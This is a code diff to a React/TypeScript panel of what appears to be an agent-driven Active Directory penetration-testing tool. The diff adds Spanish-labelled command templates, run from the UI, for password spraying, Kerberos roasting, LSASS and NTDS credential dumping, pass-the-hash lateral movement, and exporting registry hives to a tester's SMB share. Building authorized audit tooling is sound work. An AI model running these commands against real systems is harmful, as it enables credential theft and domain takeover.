@@ -11,6 +11,11 @@ type AgentPlanPanelProps = {
   onRunStarted: () => void;
 };
 
+type OperationCommand = AgentPlan["commands"][number] & {
+  name?: string;
+  notes?: string;
+};
+
 const auditPhases: { value: AuditPhase; label: string; detail: string }[] = [
   { value: "reconnaissance", label: "1. Reconocimiento", detail: "IPs, dominios, DCs, DNS, SMB, Kerberos y LDAP." },
   { value: "initial_enumeration", label: "2. Enumeracion inicial", detail: "Usuarios, grupos, shares, politicas y dominio." },
@@ -22,6 +27,87 @@ const auditPhases: { value: AuditPhase; label: string; detail: string }[] = [
   { value: "lateral_movement", label: "8. Movimiento lateral", detail: "SMB, WinRM, RDP, PsExec y WMI." },
   { value: "pivoting_post_exploitation", label: "9. Pivoting y post-explotacion", detail: "Subredes internas, evidencias, shares, backups, GPOs." },
   { value: "persistence", label: "10. Persistencia", detail: "Documentar o simular persistencia solo con permiso." },
+];
+
+function operationTemplate(
+  phase: AuditPhase,
+  name: string,
+  tool: string,
+  command: string,
+  purpose: string,
+  expectedOutput: string,
+  notes = "",
+): OperationCommand {
+  return {
+    phase,
+    name,
+    tool,
+    command,
+    purpose,
+    expected_output: expectedOutput,
+    notes,
+  };
+}
+
+const operationTemplates: OperationCommand[] = [
+  operationTemplate("reconnaissance", "Mapeo SMB del CIDR", "nxc", "nxc smb 10.10.10.0/24", "Mapear hosts SMB del rango autorizado.", "IP, hostname, dominio y contexto SMB detectado."),
+  operationTemplate("reconnaissance", "Probe LDAP del DC", "nxc", "nxc ldap 10.10.10.10", "Comprobar LDAP contra el DC candidato.", "Dominio, hostname y respuesta LDAP."),
+  operationTemplate("reconnaissance", "Servicios TCP", "nmap", "nmap -sV -Pn 10.10.10.10", "Identificar servicios TCP y versiones base.", "Puertos, servicios y versiones detectadas."),
+  operationTemplate("reconnaissance", "NetExec SMB baseline", "nxc", "nxc smb <ip_or_cidr>", "Identificar hostname, dominio, signing y contexto SMB.", "Datos base SMB del host o rango."),
+  operationTemplate("reconnaissance", "Editar /etc/hosts", "nano", "nano /etc/hosts", "Actualizar resolucion local para hosts AD detectados.", "Entradas de hosts preparadas."),
+  operationTemplate("reconnaissance", "RustScan + scripts/versiones", "rustscan", "rustscan -a <target_ip> --no-banner -- -sCV", "Acelerar descubrimiento TCP y enriquecer con scripts/versiones.", "Puertos TCP con scripts y versiones."),
+  operationTemplate("reconnaissance", "Nmap UDP top ports", "nmap", "nmap -sUV -vv --reason --version-intensity 0 --min-rate 1300 --max-retries 1 --top-ports 1000 <target_ip> -Pn", "Revisar superficie UDP prioritaria.", "Puertos UDP probables y razones de respuesta."),
+  operationTemplate("reconnaissance", "Nmap UDP puerto", "nmap", "nmap -sU -p <port> <target_ip>", "Validar manualmente un puerto UDP concreto.", "Estado del puerto UDP revisado."),
+
+  operationTemplate("initial_enumeration", "RPC null session", "rpcclient", "rpcclient -U \"\" <target_ip> -N", "Probar enumeracion RPC anonima.", "Usuarios, grupos, dominio o rechazo de acceso."),
+  operationTemplate("initial_enumeration", "RPC guest", "rpcclient", "rpcclient -U \"guest%\" <target_ip>", "Probar enumeracion RPC con Guest.", "Usuarios, grupos o restricciones visibles."),
+  operationTemplate("initial_enumeration", "SMB shares null", "nxc", "nxc smb <target_ip> -u '' -p '' --shares", "Enumerar shares accesibles sin credenciales.", "Shares y permisos anonimos."),
+  operationTemplate("initial_enumeration", "RID brute null", "nxc", "nxc smb <target_ip> -u '' -p '' --rid-brute", "Enumerar identidades via RID brute anonimo si aplica.", "Usuarios y grupos resueltos por RID."),
+  operationTemplate("initial_enumeration", "SMB shares guest", "nxc", "nxc smb <target_ip> -u 'Guest' -p '' --shares", "Enumerar shares con Guest.", "Shares y permisos con cuenta Guest."),
+  operationTemplate("initial_enumeration", "RID brute guest", "nxc", "nxc smb <target_ip> -u 'Guest' -p '' --rid-brute", "Enumerar RIDs usando Guest si esta habilitado.", "Usuarios y grupos resueltos."),
+  operationTemplate("initial_enumeration", "Password spray user=user", "nxc", "nxc smb <target_ip> -u <users_list> -p <users_list> --no-bruteforce --continue-on-success", "Validar patron usuario=password de forma controlada.", "Credenciales validas si existen.", "Usar listas controladas. Cambia users por ficheros reales si procede."),
+  operationTemplate("initial_enumeration", "Descargar share anonimo", "smbclient", "smbclient -N //<target_ip>/<share>/ -c \"recurse; prompt; mget *;\"", "Descargar contenido de un share anonimo autorizado.", "Ficheros descargados para analisis."),
+  operationTemplate("initial_enumeration", "LDAP anonimo", "ldapsearch", "ldapsearch -x -H ldap://<ip_dc> -b 'DC=<domain_part>,DC=<domain_part>'", "Consultar LDAP anonimo.", "Objetos LDAP visibles sin credenciales."),
+  operationTemplate("initial_enumeration", "Filtrar LDAP por secretos", "grep", "grep -iE \"pwd|desc|password\" -C 3 <file>", "Buscar indicios de secretos en salida LDAP o ficheros.", "Lineas relevantes con contexto."),
+  operationTemplate("initial_enumeration", "Iniciar Neo4j", "neo4j", "neo4j start", "Preparar Neo4j para BloodHound.", "Servicio Neo4j iniciado."),
+  operationTemplate("initial_enumeration", "Parar timesyncd", "systemctl", "systemctl stop systemd-timesyncd", "Evitar conflictos de sincronizacion antes de alinear hora con DC.", "Timesyncd detenido."),
+  operationTemplate("initial_enumeration", "Sincronizar hora con DC", "ntpdate", "ntpdate <ip_dc>", "Alinear hora con el DC para Kerberos.", "Hora sincronizada con DC."),
+
+  operationTemplate("credential_access", "Kerbrute userenum", "kerbrute", "kerbrute userenum --dc <ip_dc> -d <domain> <users_list>", "Validar usuarios contra Kerberos.", "Usuarios validos."),
+  operationTemplate("credential_access", "AS-REP roast", "impacket-GetNPUsers", "impacket-GetNPUsers -no-pass -usersfile <users_list> -dc-ip <ip_dc> <domain>/", "Buscar usuarios sin preautenticacion Kerberos.", "Hashes AS-REP si existen."),
+  operationTemplate("credential_access", "Crack NT hashes", "john", "john --format=NT --wordlist=<wordlist> <file>", "Intentar cracking offline de hashes NT autorizados.", "Credenciales recuperadas o estado de cracking."),
+
+  operationTemplate("initial_access", "evil-winrm password", "evil-winrm", "evil-winrm -i <target_ip> -u <user> -p <password>", "Abrir sesion WinRM con credenciales validas.", "Shell WinRM o error de acceso."),
+
+  operationTemplate("authenticated_enumeration", "RPC con credenciales", "rpcclient", "rpcclient -U \"<user>%<password>\" <target_ip>", "Enumerar RPC autenticado.", "Usuarios, grupos y dominio visibles."),
+  operationTemplate("authenticated_enumeration", "LDAP autenticado", "ldapsearch", "ldapsearch -x -H ldap://<ip_dc> -D '<user>@<domain>' -w '<password>' -b 'DC=<domain_part>,DC=<domain_part>'", "Enumerar LDAP con credenciales.", "Objetos LDAP autenticados."),
+  operationTemplate("authenticated_enumeration", "ldapdomaindump", "ldapdomaindump", "ldapdomaindump -u '<domain>\\<user>' -p '<password>' <ip_dc>", "Volcar estructura AD para analisis.", "HTML/JSON de dominio generado."),
+  operationTemplate("authenticated_enumeration", "BloodHound collection", "bloodhound-python", "bloodhound-python -u <user> -p <password> -ns <ip_dc> -d <domain> -c all", "Recolectar relaciones AD para BloodHound.", "JSON de BloodHound para importacion."),
+
+  operationTemplate("exploitation", "Kerberoast", "impacket-GetUserSPNs", "impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <ip_dc> -request -outputfile <file>", "Solicitar TGS de SPNs roastables.", "Hashes Kerberoast guardados."),
+  operationTemplate("exploitation", "Certipy templates vulnerables", "certipy-ad", "certipy-ad find -u <user> -p <password> -dc-ip <ip_dc> -vulnerable", "Buscar ADCS vulnerable y plantillas abusables.", "Hallazgos ADCS y posibles ESC."),
+
+  operationTemplate("privilege_escalation", "LSASS con password", "lsassy", "lsassy -d <domain> -u <user> -p <password> <target_ip>", "Extraer credenciales de LSASS con permiso y admin local.", "Credenciales o hashes recuperados.", "Necesita credenciales admin local."),
+  operationTemplate("privilege_escalation", "LSASS con hash NT", "lsassy", "lsassy -d <domain> -u <user> -H ':<hash_nt>' <target_ip>", "Extraer credenciales de LSASS usando hash NT.", "Credenciales o hashes recuperados.", "Necesita credenciales admin local."),
+  operationTemplate("privilege_escalation", "Dumpear NTDS con nxc", "nxc", "nxc smb <ip_dc> -u <user> -H <hash_nt> --ntds", "Dumpear NTDS desde DC con permisos suficientes.", "Hashes de dominio si esta autorizado y permitido."),
+  operationTemplate("privilege_escalation", "Secretsdump SAM + SECURITY", "impacket-secretsdump", "impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL", "Extraer secretos offline desde hives locales.", "Hashes y secretos locales."),
+  operationTemplate("privilege_escalation", "Secretsdump SAM", "impacket-secretsdump", "impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL", "Extraer hashes SAM offline.", "Hashes locales."),
+  operationTemplate("privilege_escalation", "samdump2", "samdump2", "samdump2 SAM.save SYSTEM.save -o sam.txt", "Volcar hashes desde SAM y SYSTEM.", "Archivo sam.txt con hashes."),
+
+  operationTemplate("lateral_movement", "evil-winrm hash", "evil-winrm", "evil-winrm -i <target_ip> -u <user> -H <hash_nt>", "Moverse por WinRM con hash NT valido.", "Shell WinRM o error de acceso."),
+  operationTemplate("lateral_movement", "psexec password", "impacket-psexec", "impacket-psexec <user>@<target_ip>", "Probar ejecucion remota con PsExec y password.", "Sesion remota o error de permisos."),
+  operationTemplate("lateral_movement", "psexec hash", "impacket-psexec", "impacket-psexec <user>@<target_ip> -hashes <LM>:<hash_nt>", "Probar ejecucion remota con PsExec y hash.", "Sesion remota o error de permisos."),
+  operationTemplate("lateral_movement", "RDP xfreerdp", "xfreerdp", "xfreerdp /v:<target_ip>:<port> /u:<user> /p:<password>", "Probar acceso RDP autorizado.", "Sesion RDP o error de acceso."),
+
+  operationTemplate("pivoting_post_exploitation", "Proxychains puertos AD", "proxychains", "proxychains nmap -sT -sU -p22,161,135,139,445,88,3389 <target_ip>", "Enumerar puertos AD a traves de proxy.", "Puertos alcanzables via pivot."),
+  operationTemplate("pivoting_post_exploitation", "Descargar share con usuario", "smbclient", "smbclient //<target_ip>/<share>/ -U <user> -c \"recurse; prompt; mget *;\"", "Descargar share con credenciales autorizadas.", "Ficheros descargados para analisis."),
+  operationTemplate("pivoting_post_exploitation", "SMB server Kali", "impacket-smbserver", "impacket-smbserver recurso $(pwd) -smb2support", "Levantar recurso SMB temporal en Kali.", "Servidor SMB disponible para transferencia."),
+  operationTemplate("pivoting_post_exploitation", "Backup remoto de registry", "impacket-reg", "impacket-reg '<domain>/<user>:<password>@<ip_dc>' backup -o '\\\\<kali_ip>\\recurso'", "Realizar backup remoto de registry con permisos validos.", "Hives exportadas al recurso SMB."),
+  operationTemplate("pivoting_post_exploitation", "Extraer SAM", "nxc", "nxc smb <ip_dc> -u <user> -p <password> --sam", "Extraer SAM si el alcance lo permite.", "SAM extraida."),
+  operationTemplate("pivoting_post_exploitation", "Extraer SYSTEM", "nxc", "nxc smb <ip_dc> -u <user> -p <password> --system", "Extraer SYSTEM si el alcance lo permite.", "SYSTEM extraido."),
+  operationTemplate("pivoting_post_exploitation", "Extraer SECURITY", "nxc", "nxc smb <ip_dc> -u <user> -p <password> --security", "Extraer SECURITY si el alcance lo permite.", "SECURITY extraido."),
+
+  operationTemplate("persistence", "Notas de persistencia", "nota", "# Categoria preparada para ir metiendo tecnicas validadas del entorno cuando las tengas en tus notas.", "Documentar persistencia solo con permiso explicito.", "Notas de persistencia documentadas."),
 ];
 
 export function AgentPlanPanel({
@@ -186,7 +272,7 @@ export function AgentPlanPanel({
     }
   }
 
-  async function handleRunTargetCommand(key: string, phase: string) {
+  async function handleRunTargetCommand(key: string, phase: string, fallbackCommand = "") {
     setError(null);
     if (!targetIp) {
       setError("Selecciona una IP antes de ejecutar comandos de target");
@@ -194,7 +280,7 @@ export function AgentPlanPanel({
     }
     setRunningKey(key);
     try {
-      const command = targetCommands[key];
+      const command = targetCommands[key] ?? fallbackCommand;
       const authorizedScope = command.includes(targetIp) ? targetIp : ipDc || targetIp;
       await executeAgentCommand(command, authorizedScope, phase, workingDirectory);
       onRunStarted();
@@ -390,9 +476,33 @@ export function AgentPlanPanel({
 
             {openPanels.has(phase.value) && (
               <>
+                <div className="command-list phase-command-list">
+                  {operationTemplates
+                    .filter((template) => template.phase === phase.value)
+                    .map((template, index) => {
+                      const key = commandKey("template", phase.value, template.tool, index);
+                      return (
+                        <CommandCard
+                          command={template}
+                          commandKey={key}
+                          commandValue={targetCommands[key] ?? template.command}
+                          isRunning={runningKey === key}
+                          phaseLabel={phase.label}
+                          onChange={(value) =>
+                            setTargetCommands((current) => ({
+                              ...current,
+                              [key]: value,
+                            }))
+                          }
+                          onCopy={() => handleCopy(targetCommands[key] ?? template.command)}
+                          onRun={() => handleRunTargetCommand(key, template.phase, template.command)}
+                        />
+                      );
+                    })}
+                </div>
                 <div className="command-actions phase-actions">
                   <button type="button" onClick={() => handleBuildPhasePlan(phase.value)}>
-                    Generar comandos
+                    Generar comandos dinamicos
                   </button>
                 </div>
                 {plansByPhase[phase.value]?.commands.length ? (
@@ -413,7 +523,7 @@ export function AgentPlanPanel({
                             }))
                           }
                           onCopy={() => handleCopy(targetCommands[key] ?? command.command)}
-                          onRun={() => handleRunTargetCommand(key, command.phase)}
+                          onRun={() => handleRunTargetCommand(key, command.phase, command.command)}
                         />
                       );
                     })}
@@ -442,7 +552,7 @@ function CommandCard({
   onCopy,
   onRun,
 }: {
-  command: AgentPlan["commands"][number];
+  command: OperationCommand;
   commandKey: string;
   commandValue: string;
   isRunning: boolean;
@@ -457,7 +567,7 @@ function CommandCard({
     <article className="command-row" key={commandKey}>
       <div>
         <span>{phaseLabel}</span>
-        <strong>{command.tool}</strong>
+        <strong>{command.name ? `${command.name} · ${command.tool}` : command.tool}</strong>
       </div>
       <textarea
         aria-label={`Comando ${command.tool}`}
@@ -466,6 +576,7 @@ function CommandCard({
       />
       <p>{command.purpose}</p>
       <p className="command-expected">{command.expected_output}</p>
+      {command.notes ? <p className="command-expected">{command.notes}</p> : null}
       {variables.length > 0 && (
         <div className="variable-chip-list">
           {variables.map((variable) => (
